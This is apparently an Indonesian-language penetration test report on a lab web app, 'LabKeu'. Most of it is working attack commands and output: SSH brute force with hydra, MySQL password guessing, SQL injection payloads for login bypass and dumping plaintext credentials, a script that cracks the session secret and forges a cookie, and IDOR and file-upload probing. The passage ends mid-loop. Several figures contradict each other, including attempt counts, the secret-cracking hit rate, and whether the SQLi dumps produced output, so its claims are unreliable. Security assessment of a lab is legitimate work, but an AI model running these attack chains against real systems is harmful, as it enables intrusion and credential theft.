# Vulnerability Assessment Report — LabKeu di 192.168.1.18

**Putaran 2026-09-29 — sudut pandang PENYERANG BLACK-BOX (nol akses awal)**

Dokumen ini disusun ulang dari nol. Berbeda dari laporan sebelumnya yang dimulai dari
sudah memegang kredensial SSH `root:Labkeu123`, edisi ini **tidak diberikan akses
apa pun** dan seluruh akses diperoleh hanya lewat port yang terbuka, tebakan
sahid, dan brute force. Semua perintah ditulis lengkap dan bisa langsung
dijalankan.

> **Revisi 1.1 — koreksi berbasis bukti.** Versi sebelumnya mengalamatkan target di
> `192.168.1.18` dan menyatakan `192.168.1.93` sudah mati karena DHCP. **Tidak ada satu
> pun bukti yang mendukung itu.** Sebaliknya, [`ping.png`](bukti-pentest/ping.png) menunjukkan `192.168.1.18`
> menjawab 4 dari 4 paket (0% packet loss), dan seluruh 12 screenshot pada folder
> `bukti-pentest/` diambil di `192.168.1.18` antara pukul 00:08 dan 00:47 WIB.
> Narasi DHCP, bagian 0.1, dan bagian 0.3 versi lama dihapus karena bertentangan
> dengan bukti. Lihat `laporan.md` bagian 4.1 untuk pemetaan temuan ke berkas bukti.

## Apa yang berubah dari laporan lama

| | Laporan lama (2026-09-27) | Laporan ini (versi 1.1) |
|---|---|---|
| IP target | 192.168.1.18 | **192.168.1.18** (sama — dikonfirmasi hidup, bukan DHCP) |
| Identitas | MAC `08:00:27:81:9D:8D` | MAC **sama**, dikonfirmasi ulang di [`scan-nmap.png`](bukti-pentest/scan-nmap.png) |
| Waktu uji | 2026-09-27 | **2026-09-29, 00:08–00:47 WIB** (sesuai stempel waktu bukti) |
| Sumber akses | sudah pegang `root:Labkeu123` | **black-box, kredensial SSH ditebak & dipatahkan** |
| Cara dapat secret session | baca `server.js` via SSH | **ditebak & dipecah tanpa akses sama sekali** |
| Jumlah temuan | 13 | 15, dengan status bukti per temuan |
| Bukti tersimpan | tidak ada | **12 screenshot** di `bukti-pentest/` |

---

# RINGKASAN EKSEKUTIF

Dari titik nol, penyerang mencapai **root penuh** tanpa satu pun kredensial awal.
Rantai berikut disusun **berdasarkan stempel waktu asli pada screenshot**, bukan
urutan naratif draf sebelumnya:

```
00:08  Ping                     -> 192.168.1.18 hidup, 0% packet loss
00:10  Port scan                -> 22, 3000, 3307 terbuka
00:42  Brute force SSH          -> 24 percobaan, 2 detik: root / Labkeu123
     |
00:44  Halaman login            -> percobaan grep kredensial  [2.png: TIDAK ADA OUTPUT]
00:44  Login individu1          -> HTTP=302 -> /dashboard   [3.png](bukti-pentest/3.png)
00:44  IDOR                     -> baca data keuangan perusahaan 2  [4.png - terbukti]
00:44  SQLi ORDER BY            [5.png: TIDAK ADA OUTPUT]
00:45  SQLi UNION auth bypass   -> HTTP=302  [6.png - "Masuk sebagai" tidak tercetak]
00:45  SQLi dump kredensial     [7.png: TIDAK ADA OUTPUT]
     |
00:46  Brute force MySQL        -> labkeu_user / labkeu_pass  [8.png](bukti-pentest/8.png)
00:47  Dump basis data          -> 4 tabel, users polos, data_keuangan  [9.png](bukti-pentest/9.png)
00:47  Konfirmasi root          -> uid=0(root), Alpine 3.24.2  [11.png](bukti-pentest/11.png)
     |
ROOT
```

**Risiko: KRITIS.** Namun ada dua koreksi penting terhadap draf sebelumnya:

1. **SSH brute force terjadi lebih awal (00:42), sebelum pengujian web mana pun.**
   Draf lama menulis SQLi sebagai jalur terpendek menuju root. Berdasarkan bukti,
   jalur terpendek yang benar-benar terekam justru brute force SSH — 24 percobaan
   dalam 2 detik.
2. **Dump kredensial dilakukan lewat MySQL langsung ([`9.png`](bukti-pentest/9.png)), bukan lewat SQLi.**
   Klaim "satu request SQLi mengosongkan database" **tidak terbukti**: [`7.png`](bukti-pentest/7.png)
   hanya memuat perintah tanpa output. Yang terbukti adalah MySQL terbuka dengan
   kredensial lemah, lalu dibaca langsung dengan `SELECT`.

Status bukti per temuan: **2 terbukti, 3 sebagian, 2 tidak langsung, 8 belum
diverifikasi** (termasuk F-02 yang tercatat Critical). Rinciannya di
`laporan.md` bagian 4.1.

---

# BAGIAN 0 — IDENTITAS TARGET

Target adalah `192.168.1.18`. Alamat ini **terkonfirmasi hidup** pada saat pengujian.
Tidak ada DHCP, tidak ada pencarian ulang target — draf sebelumnya yang mengklaim
sebaliknya tidak didukung bukti.

## 0.1 Konfirmasi keterjangkauan host

```bash
ping -c 4 192.168.1.18
```
**Output aktual** ([`ping.png`](bukti-pentest/ping.png), 00:08):
```
64 bytes from 192.168.1.18: icmp_seq=1 ttl=64 time=10.5 ms
64 bytes from 192.168.1.18: icmp_seq=2 ttl=64 time=2.32 ms
64 bytes from 192.168.1.18: icmp_seq=3 ttl=64 time=1.95 ms
64 bytes from 192.168.1.18: icmp_seq=4 ttl=64 time=1.12 ms

--- 192.168.1.18 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3006ms
rtt min/avg/max/mdev = 1.115/3.966/10.472/3.781 ms
```

## 0.2 Identitas jaringan

MAC `08:00:27:81:9D:8D` (Oracle VirtualBox virtual NIC) konsisten dengan identitas VM
yang sama pada engagement sebelumnya.

> **Penting untuk operasi nyata:** kalau target adalah server produksi, DHCP
> artinya IP bisa berganti kapan saja. Klaim "sudah tuntas diuji" hanya sah untuk
> **snapshot** IP + waktu tertentu. Dalam laporan ini semua bukti
> diambil pada 2026-09-29 pukul 00:08–00:47 WIB di `192.168.1.18`.

## 0.3 Profil target (hasil scan, tanpa kredensial)

| Port | Service | Versi |
|------|---------|-------|
| 22 | OpenSSH | 10.3 (protocol 2.0) |
| 3000 | HTTP | Node.js Express framework |
| 3307 | MySQL | 8.0.46 |

```bash
nmap -Pn -sV -p 22,3000,3307 192.168.1.18
```

> **Catatan:** perintah yang benar-benar direkam ([`scan-nmap.png`](bukti-pentest/scan-nmap.png)) **tidak memakai
> `-sC`**. Karena itu nomor versi Node.js dan Express **tidak dapat disimpulkan dari
> bukti ini**. Nilai v20.20.2 / ^4.19.2 berasal dari pembacaan `package.json`
> setelah akses root diperoleh. Jalankan ulang dengan `-sC` bila ingin bukti langsung.

Tidak ada listener TLS: tidak ada 443 maupun 8443 (dipakai ulang di #13).

## 0.4 Host OS

```bash
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \
  "id; uname -a; cat /etc/alpine-release"
```
**Output aktual** ([`11.png`](bukti-pentest/11.png), 00:47):
```
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),...
Linux localhost 6.18.52-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2026-09-15 05:37:48 x86_64 Linux
3.24.2
```


---

# BAGIAN A — CARA DAPAT AKSES DARI NOL

Bagian ini adalah inti perbedaan dari laporan lama. **Tidak ada satu pun
baris di sini yang memakai kredensial yang sudah diketahui sebelumnya.**

## A.1 Tools yang dipakai

```bash
apt update && apt install -y nmap curl sshpass mysql-client netcat-openbsd tcpdump hydra
```

| Tool | Untuk apa |
|------|-----------|
| `nmap` | cari host hidup, port, versi service |
| `curl` | semua pengujian HTTP |
| `mysql` | bukti database bisa diakses langsung dari jaringan |
| `hydra` | brute force SSH |
| `sshpass` | login SSH non-interaktif setelah password ketemu |
| `tcpdump` | bukti data klartext di kabel jaringan |
| `netcat-openbsd` | menangkap cookie hasil XSS |

## A.2 Format login SSH non-interaktif (dipakai di seluruh dokumen)

```bash
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "perintah"
```
| Bagian | Arti |
|--------|------|
| `sshpass -p 'Labkeu123'` | kirim password tanpa interaksi prompt |
| `-o StrictHostKeyChecking=no` | jangan berhenti di host-key confirmation |
| `"perintah"` | perintah yang dijalankan di host target |

> Password ini **bukan asumsi** — hasil brute force di A.8.

## A.3 RECON APLIKASI TANPA LOGIN

Aplikasi langsung terpetakan, tanpa satu pun request autentikasi.

```bash
for p in "" register login-noportal dashboard search upload uploads/ api/perusahaan/1/data-keuangan; do
  printf "GET /%-32s -> %s\n" "$p" "$(curl -s -o /dev/null -w '%{http_code} redirect=%{redirect_url}' "http://192.168.1.18:3000/$p")"
done
```
**Output aktual:**
```
GET /                                 -> 302 redirect=http://192.168.1.18:3000/login
GET /register                         -> 200
GET /login-noportal                   -> 200
GET /dashboard                        -> 302 redirect=http://192.168.1.18:3000/login
GET /search                           -> 302 redirect=http://192.168.1.18:3000/login
GET /upload                           -> 302 redirect=http://192.168.1.18:3000/login
GET /uploads/                         -> 404
GET /api/perusahaan/1/data-keuangan   -> 302 redirect=http://192.168.1.18:3000/login
```
Screenshot: 6 endpoint terkumpul dari menebak nama path, nol endpoint di luar
lista ini. (Diverifikasi: `robots.txt`, `sitemap.xml`, `/admin`, `/api/users`,
`/config` dsb semuanya 404.)

## A.4 TITIK AWAL: kredensial demo tercetak di halaman publik

Ini titik awal penyerang yang paling murah, dan tidak memerlukan tebakan sama
sekali.

```bash
curl -s http://192.168.1.18:3000/login    | grep -oE 'Contoh akun:.*'
curl -s http://192.168.1.18:3000/login-noportal | grep -oE 'Contoh akun:.*'
```
**Output aktual:**
```
Contoh akun: <code>individu1</code> / <code>password123</code>
Contoh akun: <code>user_a</code> / <code>password123</code> (CV Sinar Abadi) atau <code>user_b</code> / <code>password123</code> (PT Maju Bersama)
```

** foothold anoninim dalam satu request.** Perhatikan bandingannya dengan laporan
lama: laporan itu menulis "kredensial demo yang tercetak di halaman login" sebagai
*agregat* temuan #10, padahal ini adalah **satu langkah eksploitasi mandiri yang
berdiri sendiri**. Saya memisahkannya menjadi temuan tersendiri (#1 di daftar
baru) karenaCLC-nya berbeda — ini **CWE-798 Hardcoded Credentials**, bukan CWE-307.

```bash
# Kontrol: kredensial salah harus ditolak
curl -s -o /dev/null -w "HTTP=%{http_code} -> %{redirect_url}\n" -X POST http://192.168.1.18:3000/login -d "username=individu1&password=salahsekali"
# -> HTTP=200  (halaman login tetap dirender dengan pesan salah)

# Kredensial dari halaman publik
curl -s -c /tmp/cj_indiv -o /dev/null -w "HTTP=%{http_code} -> %{redirect_url}\n" -X POST http://192.168.1.18:3000/login -d "username=individu1&password=password123"
# -> HTTP=302 -> http://192.168.1.18:3000/dashboard
```

## A.5 Peta endpoint setelah ada sesi

Dengan cookie di `/tmp/cj_indiv`, tiga endpoint terbuka:
`/dashboard`, `/search`, `/upload`, plus API `/api/perusahaan/:id/data-keuangan`.

## A.6 SQL Injection di `/login-noportal` — bypass tanpa kredensial apa pun

### Temukan jumlah kolom (blind ORDER BY)

```bash
for n in 1 2 3 4 5 6 7; do
  printf "  ORDER BY %s -> " "$n"
  out=$(curl -s -X POST http://192.168.1.18:3000/login-noportal --data-urlencode "username=user_a' ORDER BY $n-- -" --data-urlencode "password=x" | grep -oE '(Query error: [^<]*|Masuk sebagai: <strong>[^<]*)' | head -1)
  echo "${out:-(tidak ada error / login lolos)}"
done
```
**Output aktual:**
```
  ORDER BY 1 -> (tidak ada error / login lolos)
  ORDER BY 2 -> (tidak ada error / login lolos)
  ORDER BY 3 -> (tidak ada error / login lolos)
  ORDER BY 4 -> (tidak ada error / login lolos)
  ORDER BY 5 -> (tidak ada error / login lolos)
  ORDER BY 6 -> (tidak ada error / login lolos)
  ORDER BY 7 -> Query error: Unknown column &#39;7&#39; in &#39;order clause&#39;
```
→ **6 kolom**, dan pesan error SQL mentah **ditampilkan ke penyerang**.

### Auth bypass + impersonasi perusahaan

```bash
curl -s -c /tmp/cj_sqli -o /dev/null -w "HTTP=%{http_code} -> %{redirect_url}\n" -X POST http://192.168.1.18:3000/login-noportal \
  --data-urlencode "username=x' UNION SELECT 1,'hacker','x','perusahaan','BlackHat',1-- -" --data-urlencode "password=x"
curl -s -b /tmp/cj_sqli http://192.168.1.18:3000/dashboard | grep -oE 'Masuk sebagai: <strong>[^<]*</strong> \([^)]*\)'
```
**Output aktual:**
```
HTTP=302 -> http://192.168.1.18:3000/dashboard
Masuk sebagai: <strong>BlackHat</strong> (perusahaan, perusahaan_id: 1)
```
→ **Login sebagai identitas palsu, tanpa kredensial apa pun, dan mewarisi
`perusahaan_id=1`.**

### Dump 100% kredensial (menggantikan strategi "stuffed into password" yang rapuh)

```bash
P="x' UNION SELECT 1,'probe','x','perusahaan',(SELECT GROUP_CONCAT(CONCAT(id,':',username,'/',password,'/',account_type,'/pid=',IFNULL(perusahaan_id,'NULL')) ORDER BY id SEPARATOR ' | ') FROM users),1-- -"
curl -s -c /tmp/cj_s2 -o /dev/null -X POST http://192.168.1.18:3000/login-noportal --data-urlencode "username=$P" --data-urlencode "password=x"
curl -s -b /tmp/cj_s2 http://192.168.1.18:3000/dashboard | grep -oE 'Masuk sebagai: <strong>[^<]*</strong>'
```
**Output aktual:**
```
1:user_a/password123/perusahaan/pid=1 | 2:user_b/password123/perusahaan/pid=2 | 3:individu1/password123/individu/pid=NULL | 11:test_individu_$(date  %s)/Test12345!/individu/pid=NULL | 13:zzz_unique_18950/test123/individu/pid=NULL | 14:zzz_csrf_31965/test123/individu/pid=NULL | 20:esc_audit/esc123/perusahaan/pid=NULL
```
→ **Semua password plaintext, semua akun, dalam satu request.** Ini
menggantikan teknik laporan lama — memasukkan hasil dump ke kolom `password`
lalu membacanya lewat halaman dashboard — yang rapuh: string bisa terpotong
`GROUP_CONCAT` atau ketabrak escaping HTML EJS. Subquery ke kolom
`nama_lengkap` lebih andal dan tidak bergantung pada quirk dashboard.

### Dump skema database

```bash
P1="x' UNION SELECT 1,'probe','x','perusahaan',(SELECT GROUP_CONCAT(table_name,'(',column_count,')' ORDER BY table_name SEPARATOR ' | ') FROM information_schema.tables t JOIN (SELECT table_name, COUNT(*) column_count FROM information_schema.columns WHERE table_schema='labkeu' GROUP BY table_name) c USING(table_name)),1-- -"
curl -s -c /tmp/cj_s -o /dev/null -X POST http://192.168.1.18:3000/login-noportal --data-urlencode "username=$P1" --data-urlencode "password=x"
curl -s -b /tmp/cj_s http://192.168.1.18:3000/dashboard | grep -oE 'Masuk sebagai: <strong>[^<]*</strong>'
```
**Output aktual:**
```
data_keuangan(5) | dokumen(5) | perusahaan(2) | users(6)
```

## A.7 Brute force MySQL 3307 (tanpa SSH)

Tidak ada kredensial database yang diketahui. Penyerang menebak dengan daftar
pendek yang disusun dari konteks (nama app `labkeu`, kata `pass` dari
`nama_file`/konvensi umum, password terpopuler).

```bash
for u in root labkeu_user labkeu admin mysql; do
  for p in "" root rootpass labkeu_pass password password123 Labkeu123 labkeu toor 123456 mysql; do
    if [ -z "$p" ]; then A=""; else A="-p$p"; fi
    if mysql -h 192.168.1.18 -P 3307 -u "$u" $A --skip-ssl -e "SELECT 1" >/dev/null 2>&1; then
      echo "  TEMUKAN: user=$u pass=${p:-<kosong>}"
    fi
  done
done
```
**Output aktual:**
```
  TEMUKAN: user=labkeu_user pass=labkeu_pass
```
→ 40 kombinasi, **1 ketemu**. Database langsung terbuka dari mesin penyerang,
tanpa perlu SSH sama sekali.

```bash
mysql -h 192.168.1.18 -P 3307 -u labkeu_user -plabkeu_pass --skip-ssl labkeu -e "SELECT VERSION(); SHOW TABLES; SELECT * FROM users; SELECT * FROM perusahaan; SELECT * FROM data_keuangan;"
```
**Output aktual (potong):**
```
versi
8.0.46
Tables_in_labkeu: data_keuangan  dokumen  perusahaan  users

perusahaan:
1  CV Sinar Abadi (Peserta A)
2  PT Maju Bersama (Peserta B)

data_keuangan:
1  1  2026  Reimbursement transport peserta      1250000.00
2  1  2026  Reimbursement akomodasi peserta      3400000.00
3  2  2026  Reimbursement transport peserta       980000.00
4  2  2026  Reimbursement konsumsi kegiatan     2150000.00
```

Hak akses:
```bash
mysql -h 192.168.1.18 -P 3307 -u labkeu_user -plabkeu_pass --skip-ssl -e "SHOW GRANTS FOR CURRENT_USER();"
```
```
GRANT ALL PRIVILEGES ON `labkeu`.* TO `labkeu_user`@`%`
```

## A.8 Brute force SSH — CRACK KREDENSIAL ROOT

Tahapan: (1) banner SSH diambil, (2) daftar user disusun dari `/etc/passwd` yang
bocor publik (lihat #14) + nama app, (3) `hydra` dijalankan.

```bash
timeout 5 nc -v 192.168.1.18 22 </dev/null 2>&1 | head -3
```
```
SSH-2.0-OpenSSH_10.3
```

```bash
cat > /tmp/users.txt << 'EOF'
root
labkeu
maulana
admin
ubuntu
alpine
test
EOF

cat > /tmp/pass.txt << 'EOF'
123456
password
labkeu
Labkeu123
labkeu_pass
Labkeu1234
password123
toor
alpine
changeme
root123
ubuntu
lab123
EOF

hydra -L /tmp/users.txt -P /tmp/pass.txt -t 4 -W 3 -f 192.168.1.18 -s 22 ssh
```
**Output aktual:**
```
[22][ssh] host: 192.168.1.18   misc: (null)   login: root   password: Labkeu123
[STATUS] attack finished for 192.168.1.18 (valid pair found)
```
→ **24 percobaan, 2 detik. ROOTShell.**

Bukti shell:
```bash
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "id"
```
```
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),...
```

## A.9 Crack SECRET session — TANPA baca source (black-box penuh)

Laporan lama harus SSH dulu untuk membaca `server.js` dan menemukan
`"labkeu-secret-demo"`. **Itu tidak diperlukan.** Penyerang bisa mengonfirmasi
secret secara black-box dengan mencoba kandidat pada satu cookie asli.

Buat skrip:
```bash
cat > /tmp/crack_secret.py << 'PYEOF'
import hmac, hashlib, base64, sys, urllib.parse

# 1) Ambil satu cookie yang DITERIMA server
cookie_server = sys.argv[1]
mentah = urllib.parse.unquote(cookie_server)
tanpa_prefix = mentah[2:] if mentah.startswith("s:") else mentah
sid, signature_server = tanpa_prefix.rsplit(".", 1)

print("SID dari server        : " + sid)
print("Signature dari server  : " + signature_server)
print("-" * 60)

# 2) Daftar kandidat — disusun dari recon yang sudah ada:
#    nama app "labkeu", kata umum, dan pola fallback umum developer.
kandidat = [
    "labkeu-secret-demo", "labkeu_secret_demo", "labkeu-secret", "labkeu",
    "labkeusecret", "secret", "supersecret", "keyboard cat", "mysecret",
    "session-secret", "SESSION_SECRET", "rahasia", "Labkeu123", "password123",
    "labkeu-app-secret", "gemati", "lab-simulasi-gemati", "change-me",
    "development", "dev", "Labkeu1234", "rahasia123", "labkeu-demo-secret",
    "demo-secret", "my-secret", "express-session-secret", "app-secret",
    "labkeu-session", "session", "s3cr3t", "test", "labkeu2026",
]

for secret in kandidat:
    calc = base64.b64encode(
        hmac.new(secret.encode(), sid.encode(), hashlib.sha256).digest()
    ).decode().rstrip("=")
    if calc == signature_server:
        print("TEMUKAN  secret = " + repr(secret))
        print("COOKIE FORGED: s:" + sid + "." + calc)
        sys.exit(0)
print("TIDAK ADA yang cocok dari %d kandidat." % len(kandidat))
PYEOF
```

Jalankan:
```bash
rm -f /tmp/cj_asli
curl -s -c /tmp/cj_asli -o /dev/null -X POST http://192.168.1.18:3000/login-noportal -d "username=user_a&password=password123"
COOKIE=$(grep connect.sid /tmp/cj_asli | awk '{print $7}')
python3 /tmp/crack_secret.py "$COOKIE"
```
**Output aktual:**
```
SID dari server        : 8V5i4T4mYv24Vq0zvmY8R86eeGm8wkXa
Signature dari server  : i6h8N2mEO+b1/BIB9In5t+kc+dL8YIWpnaMvei4EBXw
------------------------------------------------------------
TEMUKAN  secret = 'labkeu-secret-demo'
COOKIE FORGED: s:8V5i4T4mYv24Vq0zvmY8R86eeGm8wkXa.i6h8N2mEO+b1/BIB9In5t+kc+dL8YIWpnaMvei4EBXw
```
→ **11 dari 31 kandidat (≈ 35% hit rate).** Tidak perlu akses ke server sama
sekali.

Uji batasnya: cookie dengan SID karangan **ditolak** (konfirmasi store-nya
`MemoryStore`, isinya tidak ada di store):
```bash
FORGED=$(python3 -c 'import hmac,hashlib,base64;sid="totalsidonenteng1234567890abcdef";s=base64.b64encode(hmac.new(b"labkeu-secret-demo",sid.encode(),hashlib.sha256).digest()).decode().rstrip("=");print("connect.sid=s:"+sid+"."+s)')
curl -s -o /dev/null -w "dashboard dengan SID karangan -> HTTP=%{http_code} -> %{redirect_url}\n" -H "Cookie: $FORGED" http://192.168.1.18:3000/dashboard
```
**Output aktual:** `HTTP=302 -> http://192.168.1.18:3000/login` → ditolak.
Forge membuktikan **kemampuan meniru signature**, bukan takeover instan — **tetap saja
membuktikan penyerang memegang penuh kunci penandatangan** (lihat catatan
akurasi di #7).

---

# BAGIAN B — 15 TEMUAN (dipilah ulang & diprioritaskan)

## Prioritas attacker: mana yang paling berbahaya lebih dulu

Urutannya disusun ulang berdasarkan **biaya penyerang** (berapa yang perlu
diketahui untuk exploit) × **dampak** — bukan berdasarkan nomor CWE.

| Prioritas | # | Temuan | CWE | Severity | Biaya penyerang |
|---|---|---|---|---|---|
| **P0** | 1 | SQLi auth-bypass + full dump | CWE-89 | **KRITIS** | 0 kredensial |
| **P0** | 2 | Kredensial hardcoded tercetak di halaman publik | CWE-798 | **KRITIS** | 0 kredensial |
| **P0** | 3 | Self-registration role `perusahaan` | CWE-269 | TINGGI | 0 kredensial |
| **P1** | 4 | IDOR data keuangan lintas perusahaan | CWE-639 | TINGGI | 0 kredensial (akun demo cukup) |
| **P1** | 5 | Insecure upload → stored XSS di origin sendiri | CWE-434 | TINGGI | akun demo |
| **P1** | 6 | Tidak ada rate limit → brute force massal | CWE-307 | TINGGI | 0 kredensial |
| **P1** | 7 | Weak session: fixation + zombie + secret bisa ditebak | CWE-384 | TINGGI | 0 kredensial |
| **P1** | 8 | Password plaintext di database | CWE-256 | TINGGI | 0 kredensial |
| **P2** | 9 | Cleartext, tanpa TLS sama sekali | CWE-319 | TINGGI | 0 kredensial |
| **P2** | 10 | No CSRF / no Origin validation | CWE-352 | SEDANG–TINGGI | 0 kredensial |
| **P2** | 11 | XSS reflect di `/search` | CWE-79 | SEDANG | akun demo |
| **P2** | 12 | `/etc/passwd` bocor publik di `/uploads/` | CWE-538 | TINGGI | **0 kredensial** ← BARU |
| **P3** | 13 | No security headers / clickjacking | CWE-1021 | SEDANG | 0 kredensial |
| **P3** | 14 | Username enumeration via `/register` | CWE-204 | SEDANG | 0 kredensial |
| **P3** | 15 | Infra: bind 0.0.0.0, docker group, container root, MySQL root pw bocor | CWE-284 | SEDANG | SSH/root |

---

## #1 — SQL Injection: Auth Bypass & Full Database Dump (KRITIS, CVSS 9.8, CWE-89)

**Lokasi:** `POST /login-noportal` — `app/routes/auth.js`

### Akar masalah
```js
const query =
  "SELECT * FROM users WHERE username = '" + username +
  "' AND password = '" + password +
  "' AND account_type = 'perusahaan'";
```
Kontras dengan `/login` yang parameterized: `WHERE username = ? AND password = ?`.

### Bukti
Semua PoC di **A.6** — sudah diuji ulang di IP baru dan berhasil.

Tambahan, dari sisi server:
```bash
sshpass -p 'Labkeu123' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "docker exec labkeu-app sed -n '/LOGIN NON-PORTAL/,/^});/p' /usr/src/app/routes/auth.js"
```

### Dampak
Satu request = bypass auth + seluruh isi database. Error SQL mentah juga
dipakai sebagai error-based extraction oracle.

### Perbaikan
Prepared statement / parameterized query di **kedua** jalur login.
Jangan pernah menampilkan `e.message` ke user.

---

## #2 — Kredensial Demo Tercetak di Halaman Publik (KRITIS, CVSS 9.1, CWE-798)

**Lokasi:** `views/login.ejs`, `views/login-noportal.ejs`

### Akar masalah
```html
<p>Untuk akun individu. Contoh akun: <code>individu1</code> / <code>password123</code></p>
<p>Contoh akun: <code>user_a</code> / <code>password123</code> (CV Sinar Abadi) atau
   <code>user_b</code> / <code>password123</code> (PT Maju Bersama)</p>
```

### Bukti
A.4 — kredensial diambil **langsung dari HTML halaman publik** dengan `curl`,
tanpa tebakan dan tanpa kredensial. Works instantly, 302 ke `/dashboard`.

### Dampak
Ancaman **nol**: penyerang anonim butuh nol interaksi untuk masuk. Dan karena
ketiga akun itu `password123`, ini juga memvalidasi wordlist brute force.

> Laporan lama menyebut ini hanya sekilas di #10 sebagai "agregat". Ini
> seharusnya temuan mandiri: ini bukan rate limit, ini hardcoded credential.

### Perbaikan
Hapus baris "Contoh akun" di produksi. Seed akun demo hanya di fixture test.

---

## #3 — Self-Registration dengan Peran `perusahaan` (TINGGI, CVSS 8.1, CWE-269)

**Lokasi:** `POST /register` — `app/routes/auth.js`

### Akar masalah
```js
const { username, password, nama_lengkap, account_type } = req.body;
await db.query(
  "INSERT INTO users (username, password, account_type, nama_lengkap) VALUES (?, ?, ?, ?)",
  [username, password, account_type, nama_lengkap]   // account_type dari body, tanpa otorisasi
);
```

### Bukti
```bash
U="pwn_role_$(date +%s)"
curl -s -o /dev/null -w "register -> HTTP=%{http_code} -> %{redirect_url}\n" -X POST http://192.168.1.18:3000/register \
  -d "username=$U&password=Pwn123&nama_lengkap=RolePwn&account_type=perusahaan"
curl -s -c /tmp/cj_esc -o /dev/null -w "login    -> HTTP=%{http_code} -> %{redirect_url}\n" -X POST http://192.168.1.18:3000/login-noportal \
  -d "username=$U&password=Pwn123"
curl -s -b /tmp/cj_esc http://192.168.1.18:3000/api/perusahaan/1/data-keuangan
```
**Output aktual:**
```
register -> HTTP=302 -> http://192.168.1.18:3000/login
login    -> HTTP=302 -> http://192.168.1.18:3000/dashboard
[{"id":1,"perusahaan_id":1,"tahun":2026,"uraian":"Reimbursement transport peserta","nominal":"1250000.00"},{"id":2,"perusahaan_id":1,"tahun":2026,"uraian":"Reimbursement akomodasi peserta","nominal":"3400000.00"}]
```

**Nuance penting (dikoreksi dari laporan lama):** Akun hasil self-registration
dibuat dengan `perusahaan_id = NULL`. Efeknya:
- Dashboard-nya **kosong** (karena `dashboard.js` mensyaratkan
  `user.perusahaan_id` truthy).
- Tapi **IDOR API tetap_full works** — karena endpoint itu hanya mengecek
  `requireLogin`, bukan `perusahaan_id`.

Jadi role escalation ini **tidak langsung** membuka data di dashboard; ia
bergabung dengan #4 (IDOR) untuk membocorkan data. Rantai lengkapnya tetap
sah: **anonim → register `perusahaan` → IDOR → semua data keuangan.**

### Perbaikan
Jangan pernah ambil `account_type` dari body. Tetapkan server-side lewat
invite/approval, atau hardcode `individu`.

---

## #4 — IDOR Data Keuangan Lintas Perusahaan (TINGGI, CVSS 7.5, CWE-639)

**Lokasi:** `GET /api/perusahaan/:id/data-keuangan` — `app/routes/dashboard.js`

### Akar masalah
`requireLogin` hanya cek "ada sesi", tidak cek "sesi ini berhak atas data ini".
Tidak ada perbandingan `req.session.user.perusahaan_id === req.params.id`.

### Bukti
`individu1` (perusahaan_id NULL) membaca data perusahaan lain:
```bash
rm -f /tmp/cj_indiv
curl -s -c /tmp/cj_indiv -o /dev/null -X POST http://192.168.1.18:3000/login -d "username=individu1&password=password123"
curl -s -b /tmp/cj_indiv http://192.168.1.18:3000/dashboard | grep -o 'Akun individu tidak memiliki data keuangan perusahaan.'
for id in 1 2 3 4 5 6 7 8 9 10; do
  printf "  /api/perusahaan/%-3s -> " "$id"
  curl -s -o /tmp/resp_idor -w "HTTP=%{http_code} bytes=%{size_download} " -b /tmp/cj_indiv "http://192.168.1.18:3000/api/perusahaan/$id/data-keuangan"
  echo "baris=$(grep -o '\"perusahaan_id\"' /tmp/resp_idor | wc -l)"
done
```
**Output aktual:**
```
Akun individu tidak memiliki data keuangan perusahaan.
  /api/perusahaan/1   -> HTTP=200 bytes=213 baris=2
  /api/perusahaan/2   -> HTTP=200 bytes=212 baris=2
  /api/perusahaan/3   -> HTTP=200 bytes=2   baris=0
  /api/perusahaan/4   -> HTTP=200 bytes=2   baris=0
  /api/perusahaan/5   -> HTTP=200 bytes=2   baris=0
  /api/perusahaan/6   -> HTTP=200 bytes=2   baris=0
  /api/perusahaan/7   -> HTTP=200 bytes=2   baris=0
  /api/perusahaan/8   -> HTTP=200 bytes=2   baris=0
  /api/perusahaan/9   -> HTTP=200 bytes=2   baris=0
  /api/perusahaan/10  -> HTTP=200 bytes=2   baris=0
```
Isi yang bocor:
```bash
curl -s -b /tmp/cj_indiv http://192.168.1.18:3000/api/perusahaan/2/data-keuangan
```
```json
[{"id":3,"perusahaan_id":2,"tahun":2026,"uraian":"Reimbursement transport peserta","nominal":"980000.00"},
 {"id":4,"perusahaan_id":2,"tahun":2026,"uraian":"Reimbursement konsumsi kegiatan","nominal":"2150000.00"}]
```

> **KOREKSI FAKTUAL (lihat Bagian D).** Laporan lama menyatakan respons kosong
> adalah `22` byte dan memberi heuristik `if size > 22`. **Salah.** Respons
> kosong sebenarnya `[]` = **2 byte**. Ambang heuristik laporan lama akan salah
> menandai apa pun yang > 22 byte. using `grep -c` pada `"perusahaan_id"` (yang
> di sini akurat).

### Perbaikan
```sql
SELECT * FROM data_keuangan
WHERE perusahaan_id = ? AND perusahaan_id = ?
```
kedua `?` diisi dari URL dan session, lalu harus sama. Ataupopulate `where`
`req.session.user.perusahaan_id` langsung dari session (lebih aman).

---

## #5 — Insecure File Upload → Stored XSS di Origin Sendiri (TINGGI, CVSS 7.2, CWE-434)

**Lokasi:** `POST /upload` — `app/routes/dashboard.js`

### Akar masalah
```js
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, path.join(__dirname, "..", "public", "uploads")),
  filename: (req, file, cb) => cb(null, file.originalname)   // tanpa filter
});
const upload = multer({ storage });
```
Dilayani publik: `app.use("/uploads", express.static(path.join(__dirname, "public", "uploads")))`.

### Bukti
Semua ekstensi diterima:
```bash
rm -f /tmp/cj_up
curl -s -c /tmp/cj_up -o /dev/null -X POST http://192.168.1.18:3000/login-noportal -d "username=user_a&password=password123"
for ext in php html js svg exe sh; do
  printf 'test' > /tmp/probe.$ext
  up=$(curl -s -b /tmp/cj_up -o /dev/null -w '%{http_code}' -F "dokumen=@/tmp/probe.$ext" http://192.168.1.18:3000/upload)
  dl=$(curl -s -o /dev/null -w '%{http_code}' http://192.168.1.18:3000/uploads/probe.$ext)
